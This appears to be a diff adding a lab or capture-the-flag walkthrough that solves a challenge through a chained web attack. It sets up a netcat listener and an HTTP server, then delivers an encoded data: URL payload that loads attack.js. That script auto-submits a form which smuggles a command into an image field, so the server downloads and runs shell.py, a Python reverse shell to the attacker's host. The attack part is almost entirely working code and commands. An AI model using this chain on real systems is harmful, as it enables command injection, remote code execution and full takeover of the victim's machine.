@@ -1,0 +1,45 @@
+This one is a bit more complex to solve.
+
+The attacker can use an attacking server, which will receive the reverse shell,
+as well as host some ancillary files.
+Namely, the first JS file, which can be used to call the reverse shell.
+
+Note: the reverse shell was taken from gtfobins: https://gtfobins.github.io/gtfobins/python/#reverse-shell
+
+
+To set this up, have your listener open on port 4444 on your endpoint set up to receive your shell.
+
+    nc -nlvp 4444
+
+Next, set up a simple HTTP server, to serve your files:
+
+    python -m http.server 9999
+
+
+The payload will reuse the simple `data:text/html,` stream we have leveraged previously.
+It will make a `script` element, with a src attribute set to our HTTP server's attack.js
+
+    data:text/html,<script src="http://192.168.1.11:9999/attack.js"></script>
+
+Since this is in the URL, we'll encode it:
+
+    data:text%2fhtml,<script%20src="http://192.168.1.11:9999/attack.js"><%2fscript>
+
+And once we have that, we can deploy it:
+
+    http://192.168.1.26:5000/?l=data:text%2fhtml,%3Cscript%20src=%22http://192.168.1.11:9999/attack.js%22%3E%3C%2fscript%3E
+
+attacker.js
+
+    document.write("</script><form id=form action='http://resizer:4000' method=post><input name=b64_image value=\"' ; wget http://192.168.1.11:9999/shell.py; python shell.py ; touch resized-img.b64 # \"></form><script>");
+    document.getElementById('form').submit();
+
+
+shell.py
+
+    import sys,socket,os,pty;s=socket.socket()
+    s.connect(("192.168.1.11",4444))
+    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+    pty.spawn("/bin/bash")
+    
+
